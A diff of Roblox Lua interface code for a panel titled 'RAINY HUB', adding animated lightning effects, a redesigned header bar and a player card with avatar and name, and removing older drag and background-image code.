+		segGlow.Size = UDim2.new(1, 4, 0, (thickness or 2) + 4)
+		segGlow.Position = UDim2.new(0, -2, 0.5, 0)
+		segGlow.AnchorPoint = Vector2.new(0, 0.5)
+		segGlow.ZIndex = (zindex or 3) - 1
+		segGlow.Parent = seg
+
+		return seg
+	end
+
+	local function generateBoltPath(startX, startY, endX, endY, segments, jitter)
+		local points = {}
+		segments = segments or 12
+		jitter = jitter or 18
+		for i = 0, segments do
+			local t = i / segments
+			local px = startX + (endX - startX) * t
+			local py = startY + (endY - startY) * t
+			if i > 0 and i < segments then
+				px = px + rng:NextNumber(-jitter, jitter)
+				py = py + rng:NextNumber(-jitter * 0.4, jitter * 0.4)
+			end
+			table.insert(points, {x = px, y = py})
+		end
+		return points
+	end
+
+	local function drawBolt(parent, points, thickness, color, transparency, zindex)
+		local segments = {}
+		for i = 1, #points - 1 do
+			local p1 = points[i]
+			local p2 = points[i + 1]
+			local seg = createSegment(parent, p1.x, p1.y, p2.x, p2.y, thickness, color, transparency, zindex)
+			table.insert(segments, seg)
+		end
+		return segments
+	end
+
+	local function drawBranch(parent, originX, originY, angle, length, depth, segments)
+		if depth <= 0 or length < 6 then return {} end
+		local endX = originX + math.cos(angle) * length
+		local endY = originY + math.sin(angle) * length
+		local branchSegs = math.max(3, math.floor(segments * 0.6))
+		local pts = generateBoltPath(originX, originY, endX, endY, branchSegs, length * 0.18)
+		local thickness = math.max(1, 3 - depth)
+		local allSegs = drawBolt(parent, pts, thickness, LIGHTNING_COLORS.branch, 0.15 + depth * 0.12, 3)
+		if depth > 0 and rng:NextNumber() > 0.4 then
+			local branchPt = pts[math.floor(#pts * rng:NextNumber(0.3, 0.7))]
+			if branchPt then
+				local subAngle = angle + rng:NextNumber(-0.8, 0.8)
+				local subLen = length * rng:NextNumber(0.35, 0.6)
+				local subSegs = drawBranch(parent, branchPt.x, branchPt.y, subAngle, subLen, depth - 1, branchSegs)
+				for _, s in ipairs(subSegs) do table.insert(allSegs, s) end
+			end
+		end
+		return allSegs
+	end
+
+	local function createSpark(parent, x, y)
+		local sparkSize = rng:NextInteger(2, 5)
+		local spark = Instance.new("Frame")
+		spark.BackgroundColor3 = LIGHTNING_COLORS.spark
+		spark.BackgroundTransparency = 0
+		spark.BorderSizePixel = 0
+		spark.Size = UDim2.new(0, sparkSize, 0, sparkSize)
+		spark.Position = UDim2.new(0, x - sparkSize / 2, 0, y - sparkSize / 2)
+		spark.ZIndex = 4
+		spark.Parent = parent
+		corner(spark, sparkSize)
+
+		local sparkGlow = Instance.new("Frame")
+		sparkGlow.BackgroundColor3 = LIGHTNING_COLORS.glow
+		sparkGlow.BackgroundTransparency = 0.3
+		sparkGlow.BorderSizePixel = 0
+		sparkGlow.Size = UDim2.new(0, sparkSize + 6, 0, sparkSize + 6)
+		sparkGlow.Position = UDim2.new(0.5, 0, 0.5, 0)
+		sparkGlow.AnchorPoint = Vector2.new(0.5, 0.5)
+		sparkGlow.ZIndex = 3
+		sparkGlow.Parent = spark
+		corner(sparkGlow, sparkSize + 6)
+
+		return spark
+	end
+
+	local function clearLightningChildren(container)
+		for _, child in ipairs(container:GetChildren()) do
+			if child.Name ~= "FlashOverlay" and child.Name ~= "AmbientGlow"
+			   and not child:IsA("UICorner") and not child:IsA("UIGradient") then
+				child:Destroy()
+			end
+		end
+	end
+
+	local function fireStrike()
+		clearLightningChildren(LightningContainer)
+
+		local mainW = Main.AbsoluteSize.X
+		local mainH = Main.AbsoluteSize.Y
+		if mainW < 10 or mainH < 10 then return end
+
+		local strikeType = rng:NextInteger(1, 4)
+		local allSegments = {}
+		local allSparks = {}
+
+		if strikeType == 1 then
+			local startX = rng:NextNumber(mainW * 0.15, mainW * 0.85)
+			local pts = generateBoltPath(startX, -4, startX + rng:NextNumber(-40, 40), mainH + 4, 16, 22)
+			local segs = drawBolt(LightningContainer, pts, 2.5, LIGHTNING_COLORS.core, 0, 4)
+			for _, s in ipairs(segs) do table.insert(allSegments, s) end
+			local coreSegs = drawBolt(LightningContainer, pts, 1, LIGHTNING_COLORS.core, 0, 5)
+			for _, s in ipairs(coreSegs) do table.insert(allSegments, s) end
+			for i = 1, rng:NextInteger(2, 4) do
+				local branchIdx = math.floor(#pts * rng:NextNumber(0.15, 0.75))
+				local branchPt = pts[branchIdx] or pts[math.floor(#pts / 2)]
+				local angle = rng:NextNumber(-1.2, 1.2) + (math.pi / 2)
+				local branchLen = rng:NextNumber(30, 70)
+				local brSegs = drawBranch(LightningContainer, branchPt.x, branchPt.y, angle, branchLen, 2, 8)
+				for _, s in ipairs(brSegs) do table.insert(allSegments, s) end
+			end
+			for _, pt in ipairs(pts) do
+				if rng:NextNumber() > 0.7 then
+					local sp = createSpark(LightningContainer, pt.x + rng:NextNumber(-6, 6), pt.y + rng:NextNumber(-6, 6))
+					table.insert(allSparks, sp)
+				end
+			end
+
+		elseif strikeType == 2 then
+			local startY = rng:NextNumber(mainH * 0.1, mainH * 0.5)
+			local pts = generateBoltPath(-4, startY, mainW + 4, startY + rng:NextNumber(-30, 30), 14, 18)
+			local segs = drawBolt(LightningContainer, pts, 2, LIGHTNING_COLORS.primary, 0, 4)
+			for _, s in ipairs(segs) do table.insert(allSegments, s) end
+			local coreSegs = drawBolt(LightningContainer, pts, 1, LIGHTNING_COLORS.core, 0, 5)
+			for _, s in ipairs(coreSegs) do table.insert(allSegments, s) end
+			for i = 1, rng:NextInteger(1, 3) do
+				local branchIdx = math.floor(#pts * rng:NextNumber(0.2, 0.8))
+				local branchPt = pts[branchIdx] or pts[math.floor(#pts / 2)]
+				local angle = rng:NextNumber(-1.0, 1.0)
+				local branchLen = rng:NextNumber(25, 55)
+				local brSegs = drawBranch(LightningContainer, branchPt.x, branchPt.y, angle, branchLen, 2, 6)
+				for _, s in ipairs(brSegs) do table.insert(allSegments, s) end
+			end
+			for _, pt in ipairs(pts) do
+				if rng:NextNumber() > 0.75 then
+					local sp = createSpark(LightningContainer, pt.x + rng:NextNumber(-5, 5), pt.y + rng:NextNumber(-5, 5))
+					table.insert(allSparks, sp)
+				end
+			end
+
+		elseif strikeType == 3 then
+			local cx = mainW / 2
+			local cy = mainH * rng:NextNumber(0.25, 0.55)
+			local numArms = rng:NextInteger(3, 6)
+			for arm = 1, numArms do
+				local angle = (arm / numArms) * math.pi * 2 + rng:NextNumber(-0.3, 0.3)
+				local armLen = rng:NextNumber(50, 120)
+				local endX = cx + math.cos(angle) * armLen
+				local endY = cy + math.sin(angle) * armLen
+				local pts = generateBoltPath(cx, cy, endX, endY, 8, 14)
+				local segs = drawBolt(LightningContainer, pts, 2, LIGHTNING_COLORS.primary, 0.05, 4)
+				for _, s in ipairs(segs) do table.insert(allSegments, s) end
+				if rng:NextNumber() > 0.5 then
+					local midPt = pts[math.floor(#pts * 0.6)]
+					if midPt then
+						local subAngle = angle + rng:NextNumber(-0.6, 0.6)
+						local subLen = armLen * 0.4
+						local brSegs = drawBranch(LightningContainer, midPt.x, midPt.y, subAngle, subLen, 1, 5)
+						for _, s in ipairs(brSegs) do table.insert(allSegments, s) end
+					end
+				end
+			end
+			local epicenterSpark = createSpark(LightningContainer, cx, cy)
+			epicenterSpark.Size = UDim2.new(0, 8, 0, 8)
+			table.insert(allSparks, epicenterSpark)
+
+		else
+			for bolt = 1, rng:NextInteger(2, 3) do
+				local sx = rng:NextNumber(0, mainW)
+				local sy = rng:NextNumber(-4, mainH * 0.15)
+				local ex = sx + rng:NextNumber(-60, 60)
+				local ey = rng:NextNumber(mainH * 0.6, mainH + 4)
+				local pts = generateBoltPath(sx, sy, ex, ey, 12, 16)
+				local segs = drawBolt(LightningContainer, pts, 1.8, LIGHTNING_COLORS.primary, 0.08 * bolt, 4)
+				for _, s in ipairs(segs) do table.insert(allSegments, s) end
+				for i = 1, rng:NextInteger(1, 2) do
+					local branchIdx = math.floor(#pts * rng:NextNumber(0.2, 0.7))
+					local branchPt = pts[branchIdx] or pts[math.floor(#pts / 2)]
+					local angle = rng:NextNumber(-1.0, 1.0) + (math.pi / 2)
+					local branchLen = rng:NextNumber(20, 45)
+					local brSegs = drawBranch(LightningContainer, branchPt.x, branchPt.y, angle, branchLen, 1, 5)
+					for _, s in ipairs(brSegs) do table.insert(allSegments, s) end
+				end
+			end
+		end
+
+		TweenService:Create(FlashOverlay, TweenInfo.new(0.04, Enum.EasingStyle.Linear), {BackgroundTransparency = 0.82}):Play()
+		TweenService:Create(AmbientGlow, TweenInfo.new(0.06, Enum.EasingStyle.Linear), {BackgroundTransparency = 0.88}):Play()
+
+		task.delay(0.06, function()
+			TweenService:Create(FlashOverlay, TweenInfo.new(0.08, Enum.EasingStyle.Linear), {BackgroundTransparency = 1}):Play()
+			task.delay(0.09, function()
+				if rng:NextNumber() > 0.5 then
+					TweenService:Create(FlashOverlay, TweenInfo.new(0.03, Enum.EasingStyle.Linear), {BackgroundTransparency = 0.88}):Play()
+					task.delay(0.04, function()
+						TweenService:Create(FlashOverlay, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {BackgroundTransparency = 1}):Play()
+					end)
+				end
+			end)
+		end)
+
+		task.delay(0.12, function()
+			for _, seg in ipairs(allSegments) do
+				if seg and seg.Parent then
+					TweenService:Create(seg, TweenInfo.new(rng:NextNumber(0.15, 0.35), Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
+					for _, child in ipairs(seg:GetChildren()) do
+						if child:IsA("Frame") then
+							TweenService:Create(child, TweenInfo.new(rng:NextNumber(0.2, 0.4), Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
+						end
+					end
+				end
+			end
+			for _, sp in ipairs(allSparks) do
+				if sp and sp.Parent then
+					task.delay(rng:NextNumber(0.05, 0.2), function()
+						if sp and sp.Parent then
+							TweenService:Create(sp, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundTransparency = 1, Size = UDim2.new(0, 0, 0, 0)}):Play()
+							for _, child in ipairs(sp:GetChildren()) do
+								if child:IsA("Frame") then
+									TweenService:Create(child, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+								end
+							end
+						end
+					end)
+				end
+			end
+		end)
+
+		task.delay(0.5, function()
+			TweenService:Create(AmbientGlow, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
+		end)
+
+		task.delay(0.8, function()
+			clearLightningChildren(LightningContainer)
+		end)
+	end
+
+	local function ambientCrackle()
+		local mainW = Main.AbsoluteSize.X
+		local mainH = Main.AbsoluteSize.Y
+		if mainW < 10 or mainH < 10 then return end
+
+		local sx = rng:NextNumber(mainW * 0.05, mainW * 0.95)
+		local sy = rng:NextNumber(mainH * 0.05, mainH * 0.95)
+		local numSegs = rng:NextInteger(2, 5)
+		local segs = {}
+		local cx, cy = sx, sy
+		for i = 1, numSegs do
+			local angle = rng:NextNumber(0, math.pi * 2)
+			local len = rng:NextNumber(6, 18)
+			local nx = cx + math.cos(angle) * len
+			local ny = cy + math.sin(angle) * len
+			local seg = createSegment(LightningContainer, cx, cy, nx, ny, 1, LIGHTNING_COLORS.spark, 0.2, 3)
+			table.insert(segs, seg)
+			cx, cy = nx, ny
+		end
+		local sp = createSpark(LightningContainer, sx, sy)
+		task.delay(0.15, function()
+			for _, seg in ipairs(segs) do
+				if seg and seg.Parent then
+					TweenService:Create(seg, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+					for _, child in ipairs(seg:GetChildren()) do
+						if child:IsA("Frame") then
+							TweenService:Create(child, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+						end
+					end
+				end
+			end
+			if sp and sp.Parent then
+				TweenService:Create(sp, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundTransparency = 1, Size = UDim2.new(0, 0, 0, 0)}):Play()
+			end
+		end)
+		task.delay(0.4, function()
+			for _, seg in ipairs(segs) do if seg and seg.Parent then seg:Destroy() end end
+			if sp and sp.Parent then sp:Destroy() end
+		end)
+	end
+
+	local function edgeArc()
+		local mainW = Main.AbsoluteSize.X
+		local mainH = Main.AbsoluteSize.Y
+		if mainW < 10 or mainH < 10 then return end
+
+		local edge = rng:NextInteger(1, 4)
+		local sx, sy, ex, ey
+		if edge == 1 then
+			sx, sy = rng:NextNumber(0, mainW), 0
+			ex, ey = sx + rng:NextNumber(-30, 30), rng:NextNumber(15, 40)
+		elseif edge == 2 then
+			sx, sy = rng:NextNumber(0, mainW), mainH
+			ex, ey = sx + rng:NextNumber(-30, 30), mainH - rng:NextNumber(15, 40)
+		elseif edge == 3 then
+			sx, sy = 0, rng:NextNumber(0, mainH)
+			ex, ey = rng:NextNumber(15, 40), sy + rng:NextNumber(-30, 30)
+		else
+			sx, sy = mainW, rng:NextNumber(0, mainH)
+			ex, ey = mainW - rng:NextNumber(15, 40), sy + rng:NextNumber(-30, 30)
+		end
+
+		local pts = generateBoltPath(sx, sy, ex, ey, 5, 8)
+		local segs = drawBolt(LightningContainer, pts, 1.5, LIGHTNING_COLORS.glow, 0.1, 3)
+
+		local arcSpark = createSpark(LightningContainer, sx, sy)
+
+		task.delay(0.1, function()
+			for _, seg in ipairs(segs) do
+				if seg and seg.Parent then
+					TweenService:Create(seg, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+					for _, child in ipairs(seg:GetChildren()) do
+						if child:IsA("Frame") then
+							TweenService:Create(child, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+						end
+					end
+				end
+			end
+			if arcSpark and arcSpark.Parent then
+				TweenService:Create(arcSpark, TweenInfo.new(0.18, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+			end
+		end)
+		task.delay(0.35, function()
+			for _, seg in ipairs(segs) do if seg and seg.Parent then seg:Destroy() end end
+			if arcSpark and arcSpark.Parent then arcSpark:Destroy() end
+		end)
+	end
+
+	task.spawn(function()
+		task.wait(1.5)
+		while LightningContainer and LightningContainer.Parent do
+			if _G.DiceLightningEnabled ~= false then
+				fireStrike()
+				task.wait(rng:NextNumber(3.5, 7.0))
+
+				if _G.DiceLightningEnabled ~= false and rng:NextNumber() > 0.3 then
+					for _ = 1, rng:NextInteger(1, 3) do
+						if _G.DiceLightningEnabled == false then break end
+						ambientCrackle()
+						task.wait(rng:NextNumber(0.3, 0.8))
+					end
+				end
+
+				if _G.DiceLightningEnabled ~= false and rng:NextNumber() > 0.4 then
+					edgeArc()
+				end
+
+				task.wait(rng:NextNumber(1.0, 3.0))
+			else
+				task.wait(1)
+			end
+		end
+	end)
+
+	_G.DiceLightningEnabled = true
+	_G.DiceFireLightning = fireStrike
+end
+-- ═══════════════════════════════════════════════════════════════
+
+-- ═══════════════════════════════════════════════════════════════
+-- HEADER — title block on the left, player card on the right, and
+-- the window controls stacked beside it
+-- ═══════════════════════════════════════════════════════════════
+do
+local TopBar = Instance.new("Frame")
+TopBar.Name = "TopBar"
+TopBar.BackgroundColor3 = Color3.fromRGB(16, 16, 18)
+TopBar.BackgroundTransparency = 0.16
+TopBar.BorderSizePixel = 0
+TopBar.Position = UDim2.new(0, 10, 0, 10)
+TopBar.Size = UDim2.new(1, -20, 0, 86)
+TopBar.Active = true
+TopBar.ZIndex = 5
+TopBar.Parent = Main
+corner(TopBar, 12)
+stroke(TopBar, COLORS.strokeSoft, 1, 0.5)
+-- The header covers the old bare-Main drag area, so make it a handle.
+makeDraggable(Main, TopBar)
+-- Hairline along the top edge of the header, the one bright line on
+-- the whole panel.
+local TopGlow = Instance.new("Frame")
+TopGlow.Name = "TopGlow"
+TopGlow.BackgroundColor3 = COLORS.accent
+TopGlow.BackgroundTransparency = 0.25
+TopGlow.BorderSizePixel = 0
+TopGlow.AnchorPoint = Vector2.new(0.5, 0)
+TopGlow.Position = UDim2.new(0.5, 0, 0, 0)
+TopGlow.Size = UDim2.new(0.55, 0, 0, 2)
+TopGlow.ZIndex = 7
+TopGlow.Parent = TopBar
+corner(TopGlow, 1)
+do
+local fade = Instance.new("UIGradient")
+fade.Transparency = NumberSequence.new({
+NumberSequenceKeypoint.new(0, 1),
+NumberSequenceKeypoint.new(0.5, 0),
+NumberSequenceKeypoint.new(1, 1),
+})
+fade.Parent = TopGlow
+end
+local TitleDieA, setTitleDieA = makeDie(TopBar, 16, 5, false)
+TitleDieA.Name = "TitleDieA"
+TitleDieA.Position = UDim2.new(0, 14, 0, 18)
+TitleDieA.Rotation = -9
+local TitleDieB, setTitleDieB = makeDie(TopBar, 16, 2, true)
+TitleDieB.Name = "TitleDieB"
+TitleDieB.Position = UDim2.new(0, 35, 0, 18)
+TitleDieB.Rotation = 8
+-- Re-rolled whenever you change tab, so the pair is never dead weight.
+function rollTitleDice()
+task.spawn(function()
+for _ = 1, 7 do
+setTitleDieA(math.random(1, 6))
+setTitleDieB(math.random(1, 6))
+task.wait(0.045)
 end
 end)
-UserInputService.InputChanged:Connect(function(input)
-if not miniDragging then return end
-if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
-if not miniDragStart or not miniStartPos then return end
-local delta = input.Position - miniDragStart
-if math.abs(delta.X) > DRAG_DEADZONE or math.abs(delta.Y) > DRAG_DEADZONE then
-miniMoved = true
 end
-MiniFrame.Position = UDim2.new(
-miniStartPos.X.Scale,
-miniStartPos.X.Offset + delta.X,
-miniStartPos.Y.Scale,
-miniStartPos.Y.Offset + delta.Y
-)
-end)
-UserInputService.InputEnded:Connect(function(input)
-if input ~= miniHeldInput then return end
-local wasDrag = miniMoved
-miniDragging = false
-miniHeldInput = nil
-miniDragStart = nil
-miniStartPos = nil
-if wasDrag then
-return
-end
-MiniFrame.Visible = false
-Main.Size = FULL_MAIN_SIZE
-if RainyOpenAnimation then
-RainyOpenAnimation()
-else
-Main.Visible = true
-end
-savedMainPositionTable = udim2ToTable(Main.Position)
-end)
-end
--- background images removed; applyBackground now only ever clears
-local BackgroundIDs = {}
-currentBackground = tonumber(savedConfig.currentBackground) or currentBackground
-local BgImage = Instance.new("ImageLabel")
-BgImage.Name = "CustomBackground"
-BgImage.BackgroundTransparency = 1
-BgImage.ImageTransparency = 0
-BgImage.ScaleType = Enum.ScaleType.Crop
-BgImage.Size = UDim2.new(1, 0, 1, 0)
-BgImage.Position = UDim2.new(0, 0, 0, 0)
-BgImage.Visible = false
-BgImage.ZIndex = 1
-BgImage.Parent = Main
-corner(BgImage, 14)
-function applyBackground(index)
-currentBackground = index or 0
-if currentBackground == 0 then
-Main.BackgroundColor3 = COLORS.bg
-BgImage.Visible = false
-saveAceConfig()
-return "None"
-end
-local id = BackgroundIDs[currentBackground]
-if id then
-BgImage.Image = "rbxassetid://" .. id
-BgImage.Visible = true
-saveAceConfig()
-return "Image " .. tostring(currentBackground)
-end
-currentBackground = 0
-BgImage.Visible = false
-saveAceConfig()
-return "None"
-end
-applyBackground(currentBackground)
-local LogoIcon = Instance.new("ImageLabel")
-LogoIcon.Name = "LogoIcon"
-LogoIcon.BackgroundColor3 = Color3.fromRGB(7, 7, 10)
-LogoIcon.BackgroundTransparency = 0.12
-LogoIcon.BorderSizePixel = 0
-LogoIcon.Image = "rbxassetid://84453255265251"
-LogoIcon.ScaleType = Enum.ScaleType.Fit
-LogoIcon.Size = UDim2.new(0, 58, 0, 58)
-LogoIcon.Position = UDim2.new(0, 16, 0, 17)
-LogoIcon.ZIndex = 6
-LogoIcon.Visible = false -- the skull is the artwork now
-LogoIcon.Parent = Main
-corner(LogoIcon, 12)
-stroke(LogoIcon, COLORS.strokeSoft, 1, 0.35)
 local Title = Instance.new("TextLabel")
 Title.Name = "Title"
 Title.BackgroundTransparency = 1
-Title.Size = UDim2.new(0, 110, 0, 30)
-Title.Position = UDim2.new(0, 28, 0, 24)
-Title.Text = "RAINY "
+Title.Size = UDim2.new(0, 48, 0, 24)
+Title.Position = UDim2.new(0, 56, 0, 15)
+Title.Text = "RAINY"
 Title.TextColor3 = COLORS.white
-Title.TextStrokeTransparency = 0.65
+Title.TextStrokeTransparency = 0.6
 Title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
 Title.Font = Enum.Font.GothamBlack
 Title.TextSize = 19
-Title.TextTruncate = Enum.TextTruncate.AtEnd
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.ZIndex = 6
-Title.Parent = Main
+Title.Parent = TopBar
+local TitleSub = Instance.new("TextLabel")
+TitleSub.Name = "TitleSub"
+TitleSub.BackgroundTransparency = 1
+TitleSub.Size = UDim2.new(0, 90, 0, 24)
+TitleSub.Position = UDim2.new(0, 104, 0, 15)
+TitleSub.Text = "HUB"
+TitleSub.TextColor3 = COLORS.accentDim
+TitleSub.TextStrokeTransparency = 0.7
+TitleSub.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+TitleSub.Font = Enum.Font.GothamBlack
+TitleSub.TextSize = 19
+TitleSub.TextXAlignment = Enum.TextXAlignment.Left
+TitleSub.ZIndex = 6
+TitleSub.Parent = TopBar
 local Discord = Instance.new("TextLabel")
 Discord.Name = "Discord"
 Discord.BackgroundTransparency = 1
-Discord.Size = UDim2.new(0, 176, 0, 16)
-Discord.Position = UDim2.new(0, 29, 0, 50)
+Discord.Position = UDim2.new(0, 15, 0, 42)
+Discord.Size = UDim2.new(0, 170, 0, 14)
 Discord.Text = "discord.gg/rainyhub"
-Discord.TextColor3 = RAIN.accentGlow
-Discord.Font = Enum.Font.GothamSemibold
-Discord.TextSize = 12
-Discord.TextXAlignment = Enum.TextXAlignment.Left
+Discord.TextColor3 = COLORS.textDim
 Discord.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-Discord.TextStrokeTransparency = 0.25
+Discord.TextStrokeTransparency = 0.45
+Discord.Font = Enum.Font.GothamSemibold
+Discord.TextSize = 11
+Discord.TextXAlignment = Enum.TextXAlignment.Left
 Discord.ZIndex = 6
-Discord.Parent = Main
-
--- "HUB" in the accent, picking up where the white "RAINY " ends
-local TitleAccent = Instance.new("TextLabel")
-TitleAccent.Name = "TitleAccent"
-TitleAccent.BackgroundTransparency = 1
-TitleAccent.Size = UDim2.new(0, 70, 0, 30)
-TitleAccent.Position = UDim2.new(0, 96, 0, 24)
-TitleAccent.Text = "HUB"
-TitleAccent.TextColor3 = RAIN.accentGlow
-TitleAccent.TextStrokeColor3 = Color3.fromRGB(0, 8, 30)
-TitleAccent.TextStrokeTransparency = 0.2
-TitleAccent.Font = Enum.Font.GothamBlack
-TitleAccent.TextSize = 19
-TitleAccent.TextXAlignment = Enum.TextXAlignment.Left
-TitleAccent.ZIndex = 6
-TitleAccent.Parent = Main
-
--- framed header block behind the wordmark and the handle
-local HeaderBox = Instance.new("Frame")
-HeaderBox.Name = "HeaderBox"
-HeaderBox.BorderSizePixel = 0
-HeaderBox.Size = UDim2.new(0, 146, 0, 54)
-HeaderBox.Position = UDim2.new(0, 22, 0, 18)
-HeaderBox.BackgroundColor3 = COLORS.row
-HeaderBox.BackgroundTransparency = 0.55
-HeaderBox.ZIndex = 5
-HeaderBox.Parent = Main
-corner(HeaderBox, 10)
-stroke(HeaderBox, RAIN.accent, 1.2, 0.5)
-
--- the FPS/ping readout moves onto its own line under the header
-RainyStatLabel = Instance.new("TextLabel")
-RainyStatLabel.Name = "StatLine"
-RainyStatLabel.BackgroundTransparency = 1
-RainyStatLabel.Size = UDim2.new(0, 176, 0, 16)
-RainyStatLabel.Position = UDim2.new(0, 29, 0, 76)
-RainyStatLabel.Text = "FPS: -- | PING: --ms"
-RainyStatLabel.TextColor3 = COLORS.textDim
-RainyStatLabel.Font = Enum.Font.GothamSemibold
-RainyStatLabel.TextSize = 12
-RainyStatLabel.TextXAlignment = Enum.TextXAlignment.Left
-RainyStatLabel.ZIndex = 6
-RainyStatLabel.Parent = Main
-local HeaderDivider = Instance.new("Frame")
-HeaderDivider.Name = "HeaderDivider"
-HeaderDivider.BackgroundColor3 = Color3.fromRGB(70, 70, 82)
-HeaderDivider.BackgroundTransparency = 0.45
-HeaderDivider.BorderSizePixel = 0
-HeaderDivider.Size = UDim2.new(1, -34, 0, 1)
-HeaderDivider.Position = UDim2.new(0, 17, 0, 96)
-HeaderDivider.Visible = false
-HeaderDivider.ZIndex = 6
-HeaderDivider.Parent = Main
-local Close = Instance.new("TextButton")
+Discord.Parent = TopBar
+-- ═══════════════════════════════════════════════════════════════
+-- PLAYER CARD — headshot, display name, @handle and a live dot
+-- ═══════════════════════════════════════════════════════════════
+local PlayerCard = Instance.new("Frame")
+PlayerCard.Name = "PlayerCard"
+PlayerCard.BackgroundColor3 = COLORS.row2
+PlayerCard.BackgroundTransparency = 0.2
+PlayerCard.BorderSizePixel = 0
+PlayerCard.AnchorPoint = Vector2.new(1, 0.5)
+PlayerCard.Position = UDim2.new(1, -46, 0.5, 0)
+PlayerCard.Size = UDim2.new(0, 152, 0, 58)
+PlayerCard.ZIndex = 6
+PlayerCard.Parent = TopBar
+corner(PlayerCard, 11)
+stroke(PlayerCard, COLORS.strokeSoft, 1, 0.42)
+local Avatar = Instance.new("ImageLabel")
+Avatar.Name = "Avatar"
+Avatar.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
+Avatar.BackgroundTransparency = 0.15
+Avatar.BorderSizePixel = 0
+-- rbxthumb resolves on the client without the yielding thumbnail call.
+Avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(LP.UserId) .. "&w=150&h=150"
+Avatar.ScaleType = Enum.ScaleType.Fit
+Avatar.Position = UDim2.new(0, 7, 0.5, -19)
+Avatar.Size = UDim2.new(0, 38, 0, 38)
+Avatar.ZIndex = 7
+Avatar.Parent = PlayerCard
+corner(Avatar, 999)
+stroke(Avatar, COLORS.accent, 1.2, 0.35)
+local OnlineDot = Instance.new("Frame")
+OnlineDot.Name = "OnlineDot"
+OnlineDot.BackgroundColor3 = COLORS.accent
+OnlineDot.BorderSizePixel = 0
+OnlineDot.Position = UDim2.new(0, 36, 0.5, 8)
+OnlineDot.Size = UDim2.new(0, 9, 0, 9)
+OnlineDot.ZIndex = 8
+OnlineDot.Parent = PlayerCard
+corner(OnlineDot, 999)
+stroke(OnlineDot, Color3.fromRGB(12, 12, 14), 1.5, 0)
+local PlayerName = Instance.new("TextLabel")
+PlayerName.Name = "PlayerName"
+PlayerName.BackgroundTransparency = 1
+PlayerName.Position = UDim2.new(0, 52, 0.5, -18)
+PlayerName.Size = UDim2.new(1, -60, 0, 15)
+PlayerName.Text = tostring(LP.DisplayName)
+PlayerName.TextColor3 = COLORS.white
+PlayerName.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+PlayerName.TextStrokeTransparency = 0.4
+PlayerName.Font = Enum.Font.GothamBold
+PlayerName.TextSize = 11
+PlayerName.TextXAlignment = Enum.TextXAlignment.Left
+PlayerName.TextTruncate = Enum.TextTruncate.AtEnd
+PlayerName.ZIndex = 7
+PlayerName.Parent = PlayerCard
+local PlayerHandle = Instance.new("TextLabel")
+PlayerHandle.Name = "PlayerHandle"
+PlayerHandle.BackgroundTransparency = 1
+PlayerHandle.Position = UDim2.new(0, 52, 0.5, -2)
+PlayerHandle.Size = UDim2.new(1, -60, 0, 13)
+PlayerHandle.Text = "@" .. tostring(LP.Name)
+PlayerHandle.TextColor3 = COLORS.textDim
+PlayerHandle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+PlayerHandle.TextStrokeTransparency = 0.5
+PlayerHandle.Font = Enum.Font.GothamSemibold
+PlayerHandle.TextSize = 9
+PlayerHandle.TextXAlignment = Enum.TextXAlignment.Left
+PlayerHandle.TextTruncate = Enum.TextTruncate.AtEnd
+PlayerHandle.ZIndex = 7
+PlayerHandle.Parent = PlayerCard
+local CardUnderline = Instance.new("Frame")
+CardUnderline.Name = "CardUnderline"
+CardUnderline.BackgroundColor3 = COLORS.accent
+CardUnderline.BackgroundTransparency = 0.45
+CardUnderline.BorderSizePixel = 0
+CardUnderline.Position = UDim2.new(0, 52, 0.5, 14)
+CardUnderline.Size = UDim2.new(1, -66, 0, 1)
+CardUnderline.ZIndex = 7
+CardUnderline.Parent = PlayerCard
+Close = Instance.new("TextButton")
 Close.Name = "Close"
-Close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Close.BackgroundTransparency = 0.28
-Close.Text = "-"
-Close.TextColor3 = COLORS.white
-Close.TextSize = 22
-Close.Font = Enum.Font.GothamSemibold
-Close.Size = UDim2.new(0, 30, 0, 26)
-Close.Position = UDim2.new(0, 176, 0, 24)
+Close.BackgroundColor3 = Color3.fromRGB(246, 246, 250)
+Close.BackgroundTransparency = 0.04
+Close.Text = "–"
+Close.TextColor3 = Color3.fromRGB(12, 12, 14)
+Close.TextSize = 18
+Close.Font = Enum.Font.GothamBold
+Close.Size = UDim2.new(0, 30, 0, 24)
+Close.Position = UDim2.new(1, -38, 0.5, -26)
 Close.AutoButtonColor = false
-Close.ZIndex = 5
-Close.Parent = Main
-corner(Close, 8)
-stroke(Close, COLORS.stroke, 1, 0.35)
-AceLockTopButton = Instance.new("TextButton")
-AceLockTopButton.Name = "LockGUI"
-AceLockTopButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-AceLockTopButton.BackgroundTransparency = 0.28
-AceLockTopButton.TextColor3 = COLORS.white
-AceLockTopButton.TextSize = 8
-AceLockTopButton.Font = Enum.Font.GothamBlack
-AceLockTopButton.Size = UDim2.new(0, 32, 0, 26)
-AceLockTopButton.Position = UDim2.new(0, 140, 0, 24)
-AceLockTopButton.AutoButtonColor = false
-AceLockTopButton.ZIndex = 5
